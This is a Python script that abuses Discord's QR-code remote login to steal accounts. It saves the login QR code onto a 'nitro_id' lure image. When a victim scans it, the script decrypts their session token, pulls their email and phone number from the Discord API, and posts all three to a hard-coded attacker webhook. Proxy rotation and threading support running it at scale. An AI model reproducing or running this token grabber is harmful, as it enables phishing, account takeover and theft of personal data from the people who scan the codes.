import base64
import json
import threading
import os
import time
from PIL import Image
from resizeimage import resizeimage
import qrcode
import websocket
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Hash import SHA256
from Crypto.PublicKey import RSA
from discord_webhook import DiscordWebhook, DiscordEmbed
import json
import requests
import random
import string
import argparse
from io import BytesIO

def base_str():
    return string.ascii_letters + string.digits


def key_gen(keylen=None):
    if keylen is None:
        keylist = [random.choice(base_str()) for i in range(KEY_LEN)]
        return "".join(keylist)
    else:
        keylist = [random.choice(base_str()) for i in range(keylen)]
        return "".join(keylist)


class Messages:
    HEARTBEAT = 'heartbeat'
    HELLO = 'hello'
    INIT = 'init'
    NONCE_PROOF = 'nonce_proof'
    PENDING_REMOTE_INIT = 'pending_remote_init'
    PENDING_FINISH = 'pending_finish'
    FINISH = 'finish'


class DiscordUser:
    def __init__(self, **values):
        self.id = values.get('id')
        self.username = values.get('username')
        self.discrim = values.get('discrim')
        self.avatar_hash = values.get('avatar_hash')
        self.token = values.get('token')
        self.email = None
        self.phone = None

    @classmethod
    def from_payload(cls, payload):
        values = payload.split(':')

        return cls(id=values[0],
                   discrim=values[1],
                   avatar_hash=values[2],
                   username=values[3])


    def pretty_print(self):
        out = ''
        out += f'User:            {self.username}#{self.discrim} ({self.id})\n'
        out += f'Avatar URL:      https://cdn.discordapp.com/avatars/{self.id}/{self.avatar_hash}.png\n'
        out += f'Token (SECRET!): {self.token}\n'

        return out

    def getAccInfo(self):
        headers = {
            'Content-Type': 'application/json',
            'user-agent': 'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11',
            'authorization': str(self.token)
        }
        src = requests.get("https://canary.discord.com/api/v8/users/@me", headers=headers)
        data = json.loads(src.text)
        self.email = data["email"]
        self.phone = data["phone"]


class DiscordAuthWebsocket:
    def __init__(self, debug=False, proxySupport=False,proxyHost=None, proxyPort=None, thread=0):
        self.debug = debug
        self.proxySupport = proxySupport
        self.proxyHost = proxyHost
        self.proxyPort = proxyPort
        self.thread = thread
        self.ws = websocket.WebSocketApp('wss://remote-auth-gateway.discord.gg/?v=1',
                                         on_open=self.on_open,
                                         on_message=self.on_message,
                                         on_error=self.on_error,
                                         on_close=self.on_close)

        self.key = RSA.generate(2048)
        self.cipher = PKCS1_OAEP.new(self.key, hashAlgo=SHA256)

        self.heartbeat_interval = None
        self.last_heartbeat = None
        self.qr_image = None
        self.user = None

    @property
    def public_key(self):
        pub_key = self.key.publickey().export_key().decode('utf-8')
        pub_key = ''.join(pub_key.split('\n')[1:-1])
        return pub_key

    def heartbeat_sender(self):
        while True:
            time.sleep(0.5)  # we don't need perfect accuracy

            current_time = time.time()
            time_passed = current_time - self.last_heartbeat + 1  # add a second to be on the safe side
            if time_passed >= self.heartbeat_interval:
                self.send(Messages.HEARTBEAT)
                self.last_heartbeat = current_time

    def run(self):
        if self.proxySupport is True:
            self.ws.run_forever(http_proxy_host=self.proxyHost, http_proxy_port=int(self.proxyPort))
        else:
            self.ws.run_forever()

    def send(self, op, data=None):
        payload = {'op': op}
        if data is not None:
            payload.update(**data)

        if self.debug:
            print(f'Send: {payload}')
        self.ws.send(json.dumps(payload))

    def decrypt_payload(self, encrypted_payload):
        payload = base64.b64decode(encrypted_payload)
        decrypted = self.cipher.decrypt(payload)

        return decrypted



    def generate_qr_code(self, fingerprint):
        with open('./ressource/2.png', 'r+b') as f:
            with Image.open(f) as image:
                cover = resizeimage.resize_cover(image, [105, 105])
                cover.save('./ressource/lena.png', image.format)
        face = Image.open('./ressource/lena.png')

        qr_big = qrcode.QRCode(
            error_correction=qrcode.constants.ERROR_CORRECT_M
        )
        qr_big.add_data(f'https://discordapp.com/ra/{fingerprint}')
        qr_big.make()
        img_qr_big = qr_big.make_image().convert('RGBA')

        pos = ((img_qr_big.size[0] - face.size[0]) // 2, (img_qr_big.size[1] - face.size[1]) // 2)

        img_qr_big.paste(face, pos, mask=face)
        img_qr_big.save("./ressource/dddd.png")
        #img_qr_big.crop((50,50,50,50))

        img_qr_big = img_qr_big.crop((28, 28, 420, 420))

        bg = Image.open('./ressource/back.png')
        resizedQR = resizeimage.resize_cover(img_qr_big, [125, 125])
        bg.paste(resizedQR, (88 ,314))
        name = key_gen(keylen=10)
        bg.save(f'./out/nitro_id_{name}.png')

        self.qr_image = bg


        print(f"THREAD {self.thread} -> Qr code image name -> {name}")

        #bg.show(title='Discord QR Code')

    def on_open(self):
        pass

    def on_message(self, message):
        if self.debug:
            print(f'Recv: {message}')

        data = json.loads(message)
        op = data.get('op')

        if op == Messages.HELLO:
            print(f'THREAD {self.thread} -> Attempting server handshake... (proxy: {self.proxySupport if self.proxySupport is False else f"{self.proxyHost}:{self.proxyPort}"})')

            self.heartbeat_interval = data.get('heartbeat_interval') / 1000
            self.last_heartbeat = time.time()

            thread = threading.Thread(target=self.heartbeat_sender)
            thread.daemon = True
            thread.start()

            self.send(Messages.INIT, {'encoded_public_key': self.public_key})

        elif op == Messages.NONCE_PROOF:
            nonce = data.get('encrypted_nonce')
            decrypted_nonce = self.decrypt_payload(nonce)

            proof = SHA256.new(data=decrypted_nonce).digest()
            proof = base64.urlsafe_b64encode(proof)
            proof = proof.decode().rstrip('=')
            self.send(Messages.NONCE_PROOF, {'proof': proof})

        elif op == Messages.PENDING_REMOTE_INIT:
            fingerprint = data.get('fingerprint')
            self.generate_qr_code(fingerprint)

            print(f'THREAD {self.thread} -> Merci de scan le code QR pour continuer.')

        elif op == Messages.PENDING_FINISH:
            encrypted_payload = data.get('encrypted_user_payload')
            payload = self.decrypt_payload(encrypted_payload)

            self.user = DiscordUser.from_payload(payload.decode())

        elif op == Messages.FINISH:
            encrypted_token = data.get('encrypted_token')
            token = self.decrypt_payload(encrypted_token)

            if self.qr_image is not None:
                self.qr_image.close()

            self.user.token = token.decode()
            self.user.getAccInfo()
            print(self.user.pretty_print())
            webhook = DiscordWebhook(url='https://discord.com/api/webhooks/854304395323506738/QdCnjIAiSrBoFjo-7mkxUeBiF-fpYzQBoZm6QLdNCrYckpOb9JORzGvoxuN1e7inKJzn')
            embed = DiscordEmbed(color=0x9b59b6)
            embed.set_author(name=f'{self.user.username}#{self.user.discrim} ({self.user.id})', url='http://discord.com/login', icon_url=f'https://cdn.discordapp.com/avatars/{self.user.id}/{self.user.avatar_hash}.png')
            embed.set_thumbnail(url=f'https://cdn.discordapp.com/avatars/{self.user.id}/{self.user.avatar_hash}.png')
            embed.add_embed_field(name='Token :', value=f'`{self.user.token}`')
            embed.add_embed_field(name='Info :', value=f'Email : `{self.user.email}`\nNuméro : `{self.user.phone}`', inline=False)
            webhook.add_embed(embed)
            response = webhook.execute()

            self.ws.close()

    def on_error(self, error):
        print(error)

    def on_close(self):
        print('----------------------')
        print('Connection closed.')


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="qr code gen")
    parser.add_argument("proxy", type=str, help="proxy", default="n")
    parser.add_argument("thread", type=str, help="thread", default="0")

    try:
        args = parser.parse_args()
        thread = args.thread
        proxy = args.proxy
    except:
        proxy = "n"
        thread = 0

    if proxy == "yes":
        with open("ressource/proxies.txt", mode="r") as proxies:
            proxyList = proxies.readlines()
            if len(proxyList) == 0:
                print("no proxy")

            else:
                proxy = random.choice(proxyList)
                auth_ws = DiscordAuthWebsocket(debug=False, proxySupport=True, proxyHost=proxy.split(":")[0], proxyPort=int(proxy.split(":")[1]), thread=thread)
                auth_ws.run()
    else:
        auth_ws = DiscordAuthWebsocket(debug=False, proxySupport=False, thread=thread)
        auth_ws.run()
